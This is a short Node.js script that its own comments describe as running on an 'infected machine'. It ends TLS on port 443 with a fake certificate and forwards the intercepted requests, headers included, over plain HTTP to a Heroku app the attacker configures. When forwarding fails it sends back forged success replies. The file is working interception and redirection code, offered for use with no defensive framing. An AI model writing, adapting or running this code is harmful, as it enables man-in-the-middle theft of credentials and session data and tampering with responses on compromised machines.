// This script listens on port 443 of the infected machine, terminates the SSL using a fake cert, and forwards the data to the Heroku app.
// *******************************
// *** You MUST update line 12 ***
// *******************************

const https = require('https');
const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');

// CONFIGURATION
const HEROKU_APP_URL = 'your-app-name.herokuapp.com'; // CHANGE THIS
const LOCAL_IP = '127.0.0.1';

// SSL Options (Must be generated via the shell script below)
const options = {
  key: fs.readFileSync('fake-key.pem'),
  cert: fs.readFileSync('fake-cert.pem'),
};

const proxyHandler = (req, res) => {
    console.log(`[BRIDGE] Intercepting request for: ${req.headers.host}${req.url}`);

    const options = {
        hostname: HEROKU_APP_URL,
        port: 80, // Heroku listens on 80/443 public, but we bridge via standard HTTP to avoid complexity
        path: req.url,
        method: req.method,
        headers: {
            ...req.headers,
            host: HEROKU_APP_URL // Rewrite host header so Heroku accepts it
        }
    };

    const proxyReq = http.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
    });

    proxyReq.on('error', (e) => {
        console.error(`[ERROR] Bridge failed: ${e.message}`);
        // Always return 200 OK { } on error to save the drive
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true })); 
    });

    req.pipe(proxyReq, { end: true });
};

// Start the HTTPS server on port 443 (Requires Sudo/Admin)
https.createServer(options, proxyHandler).listen(443, LOCAL_IP, () => {
    console.log('--- BRIDGE ACTIVE ---');
    console.log(`Redirecting captured traffic to ${HEROKU_APP_URL}`);
});
